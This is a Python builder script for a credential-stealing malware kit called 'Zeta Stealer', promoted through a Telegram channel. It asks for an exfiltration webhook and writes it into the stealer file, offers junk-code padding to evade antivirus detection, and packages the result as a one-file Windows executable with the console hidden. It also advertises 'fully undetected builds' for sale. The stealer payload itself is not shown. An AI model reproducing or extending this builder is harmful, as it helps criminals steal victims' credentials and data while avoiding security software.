from pystyle import *
import os
import subprocess
import requests
from colorama import *
import time

os.system('clear' if os.name == 'posix' else 'cls')

intro = """

                                                                                                                  
    _/_/_/_/_/              _/                      _/_/_/    _/                          _/                      
         _/      _/_/    _/_/_/_/    _/_/_/      _/        _/_/_/_/    _/_/      _/_/_/  _/    _/_/    _/  _/_/   
      _/      _/_/_/_/    _/      _/    _/        _/_/      _/      _/_/_/_/  _/    _/  _/  _/_/_/_/  _/_/        
   _/        _/          _/      _/    _/            _/    _/      _/        _/    _/  _/  _/        _/           
_/_/_/_/_/    _/_/_/      _/_/    _/_/_/      _/_/_/        _/_/    _/_/_/    _/_/_/  _/    _/_/_/  _/            
                                                                                                                  
                                                                                                                  
             
                                                                                                                                  

                                    > Press Enter to continue                                        

"""

Anime.Fade(Center.Center(intro), Colors.blue_to_green, Colorate.Vertical, interval=0.06618, enter=True)


print(f"""{Fore.WHITE}
Welcome to Zeta Stealer (t.me/zetastealer), make sure to read the terms of usage before proceeding.\n \n \nTHE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n \n \n Press ENTER if you agree.
""")

time.sleep(1)


while True:

    choice = input()

    if choice == "":
        os.system("cls || clear")
        webhook = input(Fore.WHITE + " \n Enter Your Webhook: " + Style.RESET_ALL)

        filename = "Zeta.py"
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        new_content = content.replace('"WEBHOOK HERE"', f'"{webhook}"')
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(new_content)

        obfuscate = False
        while True:
            answer = input(Fore.WHITE + " \n Do you want to junk your code to lower the detection rate by antiviruses? (Recommended) (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                os.system("junk.py")
                Write.Print(f" \n Junk code has been added to the stealer. Thanks for using Zeta (t.me/zetastealer)", Colors.cyan)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nInvalid response. Please try again.", Colors.blue)

        while True:
                os.system("cls || clear")
                Write.Print(f" \n \n You can build an .exe file on the next window. Select One file and Windows Based (hide the console) \n \n If the window doesn't show up, do it manually at https://github.com/brentvollebregt/auto-py-to-exe\n\n (Alternatively Nuitka or Cx_Freeze for possibly fewer antivirus detections)\n\n\n\n", Colors.cyan)
                Write.Print(f" \n \n For fully undetected builds and custom tools contact us on Telegram @ zetastl / zetastealer", Colors.cyan_to_green)
                Write.Print(f" \n \n Thanks for using Zeta // You can join our Telegram channel for more (t.me/zetastealer)", Colors.cyan_to_green)
                if not obfuscate:
                    cmd = f"python -m auto_py_to_exe"
                else:
                    cmd = f"python -m auto_py_to_exe"
                subprocess.call(cmd, shell=True)
                break